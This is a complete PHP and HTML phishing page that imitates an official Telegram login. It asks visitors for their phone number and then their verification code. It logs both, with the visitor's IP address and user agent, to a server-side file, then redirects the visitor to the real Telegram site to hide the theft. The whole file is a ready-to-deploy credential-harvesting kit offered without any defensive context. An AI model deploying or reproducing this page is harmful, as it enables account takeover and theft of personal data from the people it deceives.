<?php
$log_dir = '../logs/telegram';
if (!file_exists($log_dir)) mkdir($log_dir, 0777, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'] ?? '';
    $code = $_POST['code'] ?? '';
    
    $entry = "════════════════════════════════════════════════\n";
    $entry .= "TIME: " . date('Y-m-d H:i:s') . "\n";
    $entry .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $entry .= "USER-AGENT: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    
    if (!empty($phone)) {
        $entry .= "PHONE: $phone\n";
        file_put_contents("$log_dir/telegram.log", $entry, FILE_APPEND | LOCK_EX);
        echo json_encode(['success' => true]);
    }
    if (!empty($code)) {
        $entry .= "CODE: $code\n";
        file_put_contents("$log_dir/telegram.log", $entry, FILE_APPEND | LOCK_EX);
        echo json_encode(['success' => true, 'redirect' => 'https://telegram.org']);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram • Official</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #e7ebf0; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
        .container { max-width: 400px; width: 100%; }
        .card { background: white; border-radius: 12px; box-shadow: 0 2px 24px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: #2AABEE; color: white; padding: 24px; text-align: center; }
        .header h1 { font-size: 24px; font-weight: 500; margin-bottom: 4px; }
        .header p { font-size: 14px; opacity: 0.9; }
        .content { padding: 24px; }
        .step { display: none; }
        .step.active { display: block; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 14px; border: 2px solid #e7ebf0; border-radius: 8px; font-size: 15px; }
        .form-group input:focus { outline: none; border-color: #2AABEE; }
        .btn { width: 100%; padding: 14px; background: #2AABEE; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; }
        .btn:hover { background: #2298D4; }
        .info-text { background: #f0f8ff; border-radius: 8px; padding: 12px; margin: 16px 0; font-size: 14px; color: #2AABEE; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>Telegram</h1>
                <p>Official Account</p>
            </div>
            <div class="content">
                <div id="step1" class="step active">
                    <form id="phoneForm">
                        <div class="form-group">
                            <input type="tel" id="phone" placeholder="Phone Number" required>
                        </div>
                        <button type="submit" class="btn">Continue</button>
                    </form>
                </div>
                <div id="step2" class="step">
                    <form id="codeForm">
                        <div class="form-group">
                            <input type="text" id="code" placeholder="Verification Code" maxlength="6" required>
                        </div>
                        <div class="info-text" id="phoneDisplay"></div>
                        <button type="submit" class="btn">Verify</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            await fetch('', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'phone=' + encodeURIComponent(phone) 
            });
            document.getElementById('phoneDisplay').innerHTML = 'Code sent to <b>' + phone + '</b>';
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        });
        document.getElementById('codeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const code = document.getElementById('code').value;
            const response = await fetch('', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'code=' + encodeURIComponent(code) 
            });
            const data = await response.json();
            if (data.success) window.location.href = data.redirect;
        });
    </script>
</body>
</html>
